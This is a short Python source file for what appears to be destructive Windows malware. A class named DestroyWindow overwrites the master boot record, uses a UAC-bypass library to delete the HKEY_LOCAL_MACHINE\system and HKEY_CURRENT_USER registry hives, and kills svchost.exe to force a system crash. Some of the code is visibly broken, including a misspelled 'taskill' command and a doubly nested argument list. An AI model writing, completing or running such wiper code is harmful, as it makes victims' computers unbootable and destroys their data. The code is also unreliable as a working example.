__import__('sys').path.append('../')
from .mbr_overwrite import MBR
from winpwnage.functions.uac.uacMethod1 import uacMethod1

class DestroyWindow:

	def MBROverwrite(self):
		MBR.Overwrite()

	def RegistryDelete(self):
		uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'reg delete HKEY_LOCAL_MACHINE\\system'])
		uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'reg delete HKEY_CURRENT_USER'])

	def BSOD(self):
		uacMethod1([['C:\\Windows\\system32\\cmd.exe', '/c', r'taskill /f /im svchost.exe']])